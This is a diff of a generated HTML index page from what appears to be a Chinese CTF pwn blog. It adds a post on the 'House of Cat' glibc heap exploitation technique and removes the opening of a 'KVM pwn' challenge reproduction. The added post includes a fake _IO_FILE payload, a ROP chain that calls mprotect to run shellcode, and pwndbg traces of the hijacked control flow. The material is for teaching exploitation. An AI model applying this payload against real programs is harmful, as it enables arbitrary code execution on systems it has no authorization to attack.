@@ -156,6 +156,140 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Cat-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-08-08 14:50:55" itemprop="dateCreated datePublished" datetime="2022-08-08T14:50:55+08:00">2022-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-11-08 16:52:25" itemprop="dateModified" datetime="2022-11-08T16:52:25+08:00">2022-11-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Cat"><a href="#House-Of-Cat" class="headerlink" title="House Of Cat"></a>House Of Cat</h2><p>House of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 <code>_pointer_chk_guard</code>，并且远程可能需要爆破 TLS 偏移</p>
+<p>House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35） </p>
+<hr>
+<h2 id="House-Of-Cat-原理"><a href="#House-Of-Cat-原理" class="headerlink" title="House Of Cat 原理"></a>House Of Cat 原理</h2><p>在 libc-2.34 版本中，常用的 hook 都被 ban 掉了（malloc_hook，free_hook 等），我们要尝试通过控制 IO 来获取 shell</p>
+<p>House of cat 利用了 House of emma 的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过 TLS 上 <code>_pointer_chk_guard</code> 的检测相关的IO函数的调用，转而调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_seekoff</code> 函数，然后进入到 <code>_IO_switch_to_wget_mode</code> 函数中来攻击</p>
+<p>应用场景是：</p>
+<ul>
+<li>能够任意写一个可控地址</li>
+<li>能够泄露堆地址和 libc 基址</li>
+<li>能够触发 IO 流（FSOP 或触发 <code>__malloc_assert</code>），执行 IO 相关函数</li>
+</ul>
+<p>我们跟进 <code>_IO_wfile_seekoff</code> ：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">off64_t</span> result;</span><br><span class="line">  <span class="keyword">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">      <span class="comment">/* 在此处调用_IO_switch_to_wget_mode */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>
+<p>核心调用函数 <code>_IO_switch_to_wget_mode</code> 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">        <span class="comment">/* 这里会调用_IO_WOVERFLOW,而fp可以被我们控制 */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由于 FP_err 可以被我们控制，所以可以利用宏函数 <code>_IO_WOVERFLOW</code> 完成任意代码执行</li>
+</ul>
+<h2 id="House-Of-Cat-利用姿势"><a href="#House-Of-Cat-利用姿势" class="headerlink" title="House Of Cat 利用姿势"></a>House Of Cat 利用姿势</h2><p>利用 largebin attack 劫持 <code>stderr</code> 控制为已知 heap 地址，伪造 FILE 结构体，然后使 top chunk 不足以申请从而调用 <code>sysmalloc</code></p>
+<p>其中在 <code>stderr</code> 中的 fake_IO_FILE 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x750</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x700</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload =  p64(payload_addr+<span class="number">0x10</span>) + p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x7000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(mprotect) + p64(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们可以通过偏移来调用在 vtable 表中的任意函数</li>
+<li>这里对 vtable 进行偏移，使其可以调用 <code>_IO_wfile_seekoff</code> 函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_FILE_plus*)<span class="number">0x55e88c680b00</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x421</span> &lt;error: Cannot access memory at address <span class="number">0x421</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0xffff</span> &lt;error: Cannot access memory at address <span class="number">0xffff</span>&gt;,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x55e88c680bb0</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x7fb0ed36ca6d</span> &lt;setcontext+<span class="number">61</span>&gt; <span class="string">&quot;H\213\242\240&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">0</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x55e88c680200</span>,</span><br><span class="line">    _offset = <span class="number">0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x55e88c680b30</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7fb0ed52f0d0</span> &lt;_IO_wfile_jumps+<span class="number">16</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来我们来跟进一下 House Of Cat 的触发流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d17d0</span> &lt;_IO_wfile_seekoff&gt;       endbr64 </span><br><span class="line">  <span class="number">0x7fa0ae8d17d4</span> &lt;_IO_wfile_seekoff+<span class="number">4</span>&gt;     push   r15</span><br><span class="line">  <span class="number">0x7fa0ae8d17d6</span> &lt;_IO_wfile_seekoff+<span class="number">6</span>&gt;     mov    r15, rdi</span><br><span class="line">  <span class="number">0x7fa0ae8d17d9</span> &lt;_IO_wfile_seekoff+<span class="number">9</span>&gt;     push   r14</span><br><span class="line">  <span class="number">0x7fa0ae8d17db</span> &lt;_IO_wfile_seekoff+<span class="number">11</span>&gt;    push   r13</span><br></pre></td></tr></table></figure>
+<ul>
+<li>进入 <code>_IO_wfile_seekoff</code>，然后调用 <code>_IO_switch_to_wget_mode</code>： </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d1838</span> &lt;_IO_wfile_seekoff+<span class="number">104</span>&gt;    call   _IO_switch_to_wget_mode                &lt;_IO_switch_to_wget_mode&gt;</span><br><span class="line">       rdi: <span class="number">0x5618e47bbb00</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fa0aea2a208</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x5618e47bbbb0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在这里会 <code>call [rax+0x18]</code> 而 <code>rax</code> 是我们可以控制的（就是 <code>FILE-&gt;_IO_buf_end</code>，是我们人为伪造的）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x5620ac902b40</span> ◂— <span class="number">0xffff</span></span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x5620ac902bb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x7f6ef7dc9d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>把这里修改为 <code>setcontext+61</code> 进行栈迁移（<code>rdx</code> 也是可以控制的）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5620ac902b40</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5620ac902b58</span> —▸ <span class="number">0x7f6ef7d99a6d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5620ac902b60</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5620ac902b88</span> —▸ <span class="number">0x5620ac902200</span> ◂— <span class="number">0x200000001</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5620ac902b90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后利用 House Of Kiwi 中的方式 get shell</li>
+</ul>
+<p>House Of Cat 还有另一条调用链：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__GI_exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接执行 <code>exit</code> 就可以触发，不用破坏堆结构</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/07/House%20Of%20Emma-2.34-64/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1897,363 +2031,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/KVM%20pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/12/KVM%20pwn/" class="post-title-link" itemprop="url">KVM pwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-07-12 17:27:37 / Modified: 17:28:25" itemprop="dateCreated datePublished" datetime="2022-07-12T17:27:37+08:00">2022-07-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>13k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>12 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>mykvm 复现</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = <span class="number">8888</span></span><br><span class="line">    bind        = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    server      = /home/ctf/mykvm</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source	= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu	= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mykvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1993</span>c72c363459deb6e3280880959d1f83620724, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，开了 NX，Canary，FORTIFY</li>
-</ul>
-<p>运行时出现以下报错：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./mykvm </span><br><span class="line">./mykvm: error <span class="keyword">while</span> loading shared libraries: libreadline.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
-<ul>
-<li>证明系统已经升级 libreadline.so.6 到 libreadline.so.7 或者 libreadline.so.8</li>
-</ul>
-<p>使用以下命令就可以解决：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  x86_64-linux-gnu sudo ln -s libreadline.so<span class="number">.8</span><span class="number">.0</span> libreadline.so<span class="number">.6</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>我的电脑上是 libreadline.so.8，如果是 libreadline.so.7 修改命令即可</li>
-</ul>
-<p>拖入 IDA 分析，发现如下代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">524290</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">&quot;failed to open /dev/kvm&quot;</span>);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在我的 ubuntu 上没有 <code>/dev/kvm</code></li>
-<li>学习 kvm：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_1054383/1664143">/dev/kvm简单理解</a></li>
-</ul>
-<p>学习了一下陌生的函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">readline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>prompt：指向提示字符串</li>
-<li>readline 的返回值就是该行文本的指针：<ul>
-<li>如果是一个空行,那么将返回一个空的字符串</li>
-<li>如果在读某一行的过程中遇到了EOF错误，并且是空行的话，便会返回NULL</li>
-<li>如果不是空行的话，便会将其当做新的一行</li>
-</ul>
-</li>
-<li>返回值由 malloc() 分配的空间存储，故调用结束后应通过 free() 显式地释放内存 </li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_history</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我们希望输入过的命令行，还可以通过 <code>C-p</code> 或者 <code>C-s</code> 来搜索到，那么就需要将命令行加入到历史列表中，可以调用 <code>add_history()</code> 函数来完成</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>start：指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回</li>
-<li>length：代表将要把文件映射到内存的字节大小</li>
-<li>prot：代表映射区域的保护方式 </li>
-<li>flags：会影响映射区域的各种特性</li>
-<li>fd：文件描述词，代表欲映射到内存的文件</li>
-<li>offset：文件映射的偏移量，通常设置为“0”，代表从文件最前方开始对应，offset 必须是分页大小的整数倍</li>
-</ul>
-<p>参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hazir/p/instruction_to_readline.html">GNU Readline 库及编程简介</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7e7a43e98957">mmap函数详解与代码实操</a> </li>
-</ul>
-<p><strong>KVM (kernel-based virtual machine) 简述</strong></p>
-<p><code>/dev/kvm</code> 设备是 kvm(kernel-based virtual machine) 虚拟机的一个设备文件</p>
-<p>一，qemu 是一个模拟软件，运行于 linux 的用户空间，qemu 可以模拟我们能见到的所有操作系统，由于是通过模拟的方法来实现系统虚拟化，它产生的所有 CPU 指令都翻译转换一次，因此其性能非常低</p>
